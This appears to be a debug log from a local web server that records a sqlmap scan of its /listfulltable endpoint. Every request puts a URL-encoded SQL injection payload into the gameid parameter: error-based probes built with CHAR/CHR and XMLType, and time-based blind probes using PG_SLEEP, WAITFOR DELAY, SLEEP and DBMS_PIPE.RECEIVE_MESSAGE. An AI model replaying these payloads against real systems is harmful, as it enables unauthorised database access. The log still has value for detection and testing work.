[D 180302 141625365]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%208344%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288344%3D8344%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29%20AND%20%288795%3D8795', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141632005]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%208344%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288344%3D8344%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141637412]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%208344%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%28118%29%2BCHAR%28118%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%288344%3D8344%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28118%29%2BCHAR%28122%29%2BCHAR%28113%29%29%29--%20KnkA', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141646158]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%207391%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287391%3D7391%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%27DzlV%27%3D%27DzlV', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141652461]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%207391%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287391%3D7391%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27fvgY%27%3D%27fvgY', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141700307]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%207391%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287391%3D7391%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141706766]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%207391%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287391%3D7391%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%288028%3D8028', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141714136]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%207391%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287391%3D7391%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141721688]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%207391%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%287391%3D7391%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%2898%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20FNip', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141749423]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%3BSELECT%20PG_SLEEP%285%29--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141753165]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%3BSELECT%20PG_SLEEP%285%29--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141759220]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%3BSELECT%20PG_SLEEP%285%29--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141805659]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%3BSELECT%20PG_SLEEP%285%29--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141811602]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%3BSELECT%20PG_SLEEP%285%29--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141818580]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141824866]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141830499]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141835846]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141842126]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141847457]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%28112%29%7C%7CCHR%2880%29%2C5%29%20FROM%20DUAL--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141852298]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%28112%29%7C%7CCHR%2880%29%2C5%29%20FROM%20DUAL--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141859046]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%28112%29%7C%7CCHR%2880%29%2C5%29%20FROM%20DUAL--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141905591]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%28112%29%7C%7CCHR%2880%29%2C5%29%20FROM%20DUAL--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141912714]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28103%29%7C%7CCHR%2877%29%7C%7CCHR%28112%29%7C%7CCHR%2880%29%2C5%29%20FROM%20DUAL--', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141921289]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%20SLEEP%285%29%20AND%20%28%27qogW%27%3D%27qogW', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141929807]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%20SLEEP%285%29%20AND%20%27kTTn%27%3D%27kTTn', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141936597]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%20SLEEP%285%29%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141942308]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%20SLEEP%285%29%20AND%20%287573%3D7573', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141949866]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%20SLEEP%285%29', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 141956080]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%20SLEEP%285%29--%20OfIk', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142002313]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%208106%3D%28SELECT%208106%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%27tPwp%27%3D%27tPwp', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142007433]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%208106%3D%28SELECT%208106%20FROM%20PG_SLEEP%285%29%29%20AND%20%27UwKZ%27%3D%27UwKZ', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142012677]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%208106%3D%28SELECT%208106%20FROM%20PG_SLEEP%285%29%29%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142019993]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%208106%3D%28SELECT%208106%20FROM%20PG_SLEEP%285%29%29%20AND%20%288803%3D8803', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142026355]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%208106%3D%28SELECT%208106%20FROM%20PG_SLEEP%285%29%29', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142043808]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20AND%208106%3D%28SELECT%208106%20FROM%20PG_SLEEP%285%29%29--%20bWoU', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142050055]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%28%27qBgo%27%3D%27qBgo', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142057637]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27WTqN%27%3D%27WTqN', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142103264]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142110036]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20WAITFOR%20DELAY%20%270%3A0%3A5%27%20AND%20%286466%3D6466', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142118537]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20WAITFOR%20DELAY%20%270%3A0%3A5%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142128195]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%20WAITFOR%20DELAY%20%270%3A0%3A5%27--%20tWbh', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142133968]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%29%20AND%208023%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28120%29%7C%7CCHR%28104%29%7C%7CCHR%2879%29%2C5%29%20AND%20%28%27GUwo%27%3D%27GUwo', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142136275]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%27%20AND%208023%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28120%29%7C%7CCHR%28104%29%7C%7CCHR%2879%29%2C5%29%20AND%20%27cawV%27%3D%27cawV', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142138512]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%25%27%20AND%208023%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28120%29%7C%7CCHR%28104%29%7C%7CCHR%2879%29%2C5%29%20AND%20%27%25%27%3D%27', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
[D 180302 142140943]: Full request HTTPServerRequest(protocol='http', host='localhost:8008', method='GET', uri='/listfulltable?gameid=POKER%29%20AND%208023%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28108%29%7C%7CCHR%28120%29%7C%7CCHR%28104%29%7C%7CCHR%2879%29%2C5%29%20AND%20%281307%3D1307', version='HTTP/1.1', remote_ip='127.0.0.1', headers={'Accept-Encoding': 'gzip,deflate', 'Connection': 'upgrade', 'Accept': '*/*', 'User-Agent': 'sqlmap/1.2.2#stable (http://sqlmap.org)', 'Host': 'localhost:8008', 'Cache-Control': 'no-cache'})
